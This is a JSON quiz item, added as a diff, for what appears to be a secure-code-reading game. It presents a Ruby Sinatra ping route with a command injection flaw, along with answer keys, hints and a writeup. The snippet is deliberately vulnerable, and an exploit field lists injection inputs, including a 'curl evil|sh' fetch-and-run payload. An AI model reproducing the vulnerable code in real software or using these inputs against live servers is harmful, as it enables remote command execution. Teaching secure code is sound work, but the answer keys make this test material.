@@ -1,0 +1,110 @@
+{
+  "id": "srd-0016",
+  "date": "2026-10-15",
+  "difficulty": "easy",
+  "language": "ruby",
+  "estimatedMinutes": 5,
+  "snippet": {
+    "files": [
+      {
+        "name": "ping.rb",
+        "code": "require \"sinatra\"\n\nget \"/ping\" do\n  host = params[\"host\"]\n  # Ping the host and show the output.\n  output = `ping -c 1 #{host}`\n  \"<pre>#{output}</pre>\"\nend",
+        "notes": {
+          "3": "Defines the GET /ping route.",
+          "4": "Reads the `host` query parameter — attacker-controlled.",
+          "6": "Backticks run a shell command; `#{host}` is interpolated into the command string.",
+          "7": "Returns the command output wrapped in a <pre> block."
+        }
+      }
+    ]
+  },
+  "stages": {
+    "line": {
+      "file": "ping.rb",
+      "line": 6,
+      "yellowRadius": 1,
+      "maxGuesses": 5
+    },
+    "bugClass": {
+      "answer": "command-inj",
+      "options": [
+        "command-inj",
+        "code-inj",
+        "sqli",
+        "ssrf",
+        "open-redirect"
+      ]
+    },
+    "why": {
+      "answerIndex": 2,
+      "options": [
+        {
+          "label": "`params` can be nil, raising an error",
+          "whyWrong": "A nil check is robustness, not the vulnerability."
+        },
+        {
+          "label": "The output is echoed into HTML, which is the main risk",
+          "whyWrong": "That is a real secondary issue (XSS), but the primary flaw is that the input reaches a shell as a command."
+        },
+        {
+          "label": "Backticks execute a shell, and `#{host}` is interpolated into it, so shell metacharacters run as commands"
+        }
+      ]
+    },
+    "fix": {
+      "answerIndex": 1,
+      "options": [
+        {
+          "label": "Remove ';' from host",
+          "diff": "+  host = host.delete(\";\")\n   output = `ping -c 1 #{host}`",
+          "whyWrong": "Other separators (`|`, `&&`, `$()`, backticks, newlines) still work."
+        },
+        {
+          "label": "Run ping via an argument array without a shell",
+          "diff": "-  output = `ping -c 1 #{host}`\n+  require \"open3\"\n+  output, _ = Open3.capture2(\"ping\", \"-c\", \"1\", host)"
+        },
+        {
+          "label": "Wrap host in double quotes inside the command",
+          "diff": "-  output = `ping -c 1 #{host}`\n+  output = `ping -c 1 \"#{host}\"`",
+          "whyWrong": "`$()` and backticks are still interpreted inside double quotes."
+        },
+        {
+          "label": "HTML-escape the output before display",
+          "diff": "-  \"<pre>#{output}</pre>\"\n+  \"<pre>#{Rack::Utils.escape_html(output)}</pre>\"",
+          "whyWrong": "That mitigates the separate XSS, not the command execution on line 6."
+        }
+      ]
+    }
+  },
+  "source": {
+    "origin": "original",
+    "license": "CC0-1.0",
+    "attribution": "SourceReadle original"
+  },
+  "training": {
+    "exploit": "Request `?host=localhost%3B id` (i.e. `localhost; id`). The shell runs `ping -c 1 localhost`, then `id`. `$(curl evil|sh)` and backticks work too.",
+    "concepts": [
+      "CWE-78",
+      "OWASP A03:2021"
+    ],
+    "hints": {
+      "line": "Which construct hands a built-up string to a shell?",
+      "bugClass": "The input reaches the operating system shell.",
+      "why": "What does the shell do with `;` in the command?",
+      "fix": "Execute with an argument array, no shell."
+    }
+  },
+  "writeup": {
+    "summary": "Backticks in Ruby run the string through a shell, and `#{host}` interpolates attacker input directly into that command. A `host` of `localhost; id` runs an extra command. Executing via an argument array (`Open3.capture2(\"ping\", \"-c\", \"1\", host)`) passes `host` as a single argument with no shell to interpret metacharacters. (Line 7 also echoes output into HTML — a separate XSS worth fixing too.)",
+    "readNext": [
+      {
+        "label": "Ruby Open3 docs",
+        "url": "https://docs.ruby-lang.org/en/master/Open3.html"
+      },
+      {
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+      }
+    ]
+  }
+}
